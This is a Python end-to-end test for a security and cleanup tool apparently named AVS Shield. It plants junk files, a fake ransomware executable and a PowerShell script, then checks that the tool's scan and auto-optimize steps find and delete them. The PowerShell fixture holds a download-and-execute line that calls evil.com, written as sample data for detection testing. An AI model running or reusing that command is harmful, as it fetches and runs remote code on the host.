#!/usr/bin/env python3
"""
V1.0 Re-audit E2E test — verifies scan-detect-clean-results with ACTUAL file deletion.

Creates real temp files, runs a scan, verifies they are detected,
runs auto-optimize, verifies the files are ACTUALLY DELETED from disk,
and checks the result format.

Run with: python _test_e2e_reaudit.py
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# ── Config ──────────────────────────────────────────────────────────
BACKEND_DIR = Path(__file__).parent / "backend"
METADATA_DB = Path(os.environ.get("LOCALAPPDATA", "")) / "AVS Shield" / "metadata.db"


def main():
    print("=" * 60)
    print("  V1.0 RE-AUDIT E2E - Scan -> Detect -> Clean -> Verify")
    print("=" * 60)

    # ── Step 0: Create test files in temp directory ────────────────
    print("\n[0] Creating test files in temp directory...")
    temp_dir = Path(os.environ.get("TEMP", tempfile.gettempdir()))
    test_files = []

    # Create 5 junk temp files
    for i in range(5):
        f = temp_dir / f"avs_test_junk_{i}.tmp"
        f.write_bytes(b"JUNK DATA " * 100)
        test_files.append(f)
        print(f"  Created: {f}")

    # Create a "malicious" named file
    malicious = temp_dir / "ransomware_test.exe"
    malicious.write_bytes(b"FAKE MALWARE " * 50)
    test_files.append(malicious)
    print(f"  Created: {malicious}")

    # Create a suspicious script
    script = temp_dir / "avs_test_suspicious.ps1"
    script.write_text("IEX(New-Object Net.WebClient).DownloadString('http://evil.com')")
    test_files.append(script)
    print(f"  Created: {script}")

    print(f"\n  Total test files created: {len(test_files)}")

    # ── Step 1: Start backend ──────────────────────────────────────
    print("\n[1] Starting backend (non-packaged)...")
    # Delete old metadata DB for fresh scan
    try:
        METADATA_DB.unlink(missing_ok=True)
    except Exception:
        pass

    env = os.environ.copy()
    env["PYTHONPATH"] = str(BACKEND_DIR / "src")

    proc = subprocess.Popen(
        [sys.executable, "-m", "avs_backend.api.rpc_server"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=str(BACKEND_DIR),
        env=env,
    )

    msg_id = 0
    pending = {}
    buffer = ""

    def send(method, params=None):
        nonlocal msg_id, buffer
        msg_id += 1
        req = json.dumps({"jsonrpc": "2.0", "id": msg_id, "method": method, "params": params or {}})
        proc.stdin.write(req + "\n")
        proc.stdin.flush()
        # Wait for response
        deadline = time.time() + 120
        while time.time() < deadline:
            if proc.poll() is not None:
                raise RuntimeError(f"Backend exited with code {proc.returncode}")
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.1)
                continue
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                resp = json.loads(line)
                if resp.get("id") == msg_id:
                    if "error" in resp:
                        return {"error": resp["error"]}
                    return resp.get("result", {})
            except json.JSONDecodeError:
                continue
        raise TimeoutError(f"Timeout waiting for response to {method}")

    def poll_status(method, params, max_polls=300, interval=1.0):
        for i in range(max_polls):
            status = send(method, params)
            phase = status.get("phase", "unknown")
            completed = status.get("completed", False)
            progress = status.get("progress", {})
            if isinstance(progress, dict):
                pct = progress.get("completion_percent", 0)
            else:
                pct = 0
            if i % 10 == 0 or completed:
                print(f"  Poll {i+1}: {pct}% | phase={phase}")
            if completed or phase in ("complete", "completed", "error", "cancelled"):
                return status
            time.sleep(interval)
        raise TimeoutError("Polling timed out")

    try:
        # ── Step 2: Ping ───────────────────────────────────────────
        print("\n[2] Pinging backend...")
        ping = send("system.ping")
        print(f"  Ping result: {ping}")

        # ── Step 3: Start quick scan ───────────────────────────────
        print("\n[3] Starting quick scan...")
        # Wait for orchestrator to be ready
        scan_start = None
        for attempt in range(60):
            result = send("scan_core.scan.quick", {})
            if result.get("ok") and result.get("session_id"):
                scan_start = result
                break
            if attempt % 10 == 0:
                print(f"  Attempt {attempt+1}: {result.get('error', 'waiting...')}")
            time.sleep(2)

        if not scan_start:
            print(f"  FAILED to start scan: {result}")
            return 1

        session_id = scan_start["session_id"]
        print(f"  Scan started: session_id={session_id}")

        # ── Step 4: Poll scan status ───────────────────────────────
        print("\n[4] Polling scan status...")
        scan_status = poll_status("scan_core.scan.status", {"session_id": session_id})
        print(f"  Scan completed: phase={scan_status.get('phase')}")

        # ── Step 5: Get scan result ────────────────────────────────
        print("\n[5] Getting scan result...")
        scan_res = send("scan_core.scan.result", {"session_id": session_id})
        result = scan_res.get("result", scan_res)
        plan_id = result.get("plan_id") or result.get("action_plan_id")
        findings_count = result.get("findings_count", 0)
        stats = result.get("statistics", {})

        print(f"  plan_id: {plan_id}")
        print(f"  findings_count: {findings_count}")
        print(f"  assets_discovered: {stats.get('assets_discovered', 'N/A')}")

        if not plan_id:
            print("  WARNING: No plan_id — no actionable findings")
            # Check if our test files were even discovered
            if findings_count == 0:
                print("  ERROR: No findings at all! Test files may not have been discovered.")
            # Still continue to check file existence

        # ── Step 6: Verify test files still exist (pre-clean) ───────
        print("\n[6] Verifying test files exist BEFORE cleaning...")
        existing_before = []
        for f in test_files:
            exists = f.exists()
            existing_before.append(exists)
            print(f"  {f.name}: {'EXISTS' if exists else 'MISSING'}")

        # ── Step 7: Run auto-optimize ──────────────────────────────
        if plan_id:
            print(f"\n[7] Starting auto-optimize (plan_id={plan_id})...")
            opt_result = send("scan_core.dashboard.auto_optimize", {
                "plan_id": plan_id,
                "mode": "live",
            })
            opt_session = opt_result.get("session_id")
            print(f"  Auto-optimize started: session_id={opt_session}")

            # ── Step 8: Poll auto-optimize status ───────────────────
            print("\n[8] Polling auto-optimize status...")
            opt_status = poll_status(
                "scan_core.dashboard.auto_optimize_status",
                {"session_id": opt_session},
            )
            print(f"  Auto-optimize completed: phase={opt_status.get('phase')}")

            # ── Step 9: Check result format ─────────────────────────
            print("\n[9] Checking result format...")
            r = opt_status.get("result", {})
            print(f"  Result keys: {list(r.keys())}")
            print(f"  files_found: {r.get('files_found', 'MISSING')}")
            print(f"  files_cleaned: {r.get('files_cleaned', 'MISSING')}")
            print(f"  space_recovered: {r.get('space_recovered', 'MISSING')}")

            # Verify user-facing fields exist
            required = ["files_found", "files_cleaned", "space_recovered"]
            for field in required:
                if field not in r:
                    print(f"  ERROR: Missing user-facing field '{field}'")

            # Verify _diagnostics is internal
            if "_diagnostics" in r:
                print(f"  _diagnostics present (internal): {list(r['_diagnostics'].keys())}")
        else:
            print("\n[7] Skipping auto-optimize (no plan_id)")

        # ── Step 10: Verify test files are DELETED ─────────────────
        print("\n[10] Verifying test files AFTER cleaning...")
        deleted_count = 0
        still_exist = 0
        for f in test_files:
            exists = f.exists()
            if exists:
                still_exist += 1
                print(f"  {f.name}: STILL EXISTS (not cleaned)")
            else:
                deleted_count += 1
                print(f"  {f.name}: DELETED [OK]")

        # ── Summary ────────────────────────────────────────────────
        print("\n" + "=" * 60)
        print("  RE-AUDIT E2E SUMMARY")
        print("=" * 60)
        print(f"  Test files created: {len(test_files)}")
        print(f"  Files deleted by auto-optimize: {deleted_count}")
        print(f"  Files still existing: {still_exist}")
        if plan_id:
            print(f"  Scan findings_count: {findings_count}")
            print(f"  Auto-optimize files_found: {r.get('files_found', 'N/A')}")
            print(f"  Auto-optimize files_cleaned: {r.get('files_cleaned', 'N/A')}")
            print(f"  Auto-optimize space_recovered: {r.get('space_recovered', 'N/A')} bytes")

        if deleted_count > 0:
            print("\n  [OK] ACTUAL FILE DELETION VERIFIED")
        else:
            print("\n  [WARN] No test files were deleted (may be expected if SafetyGate blocked them)")

        # Cleanup any remaining test files
        for f in test_files:
            try:
                f.unlink(missing_ok=True)
            except Exception:
                pass

        print("\n  DONE")
        return 0

    except Exception as e:
        print(f"\n  ERROR: {e}")
        import traceback
        traceback.print_exc()
        return 1
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


if __name__ == "__main__":
    sys.exit(main())
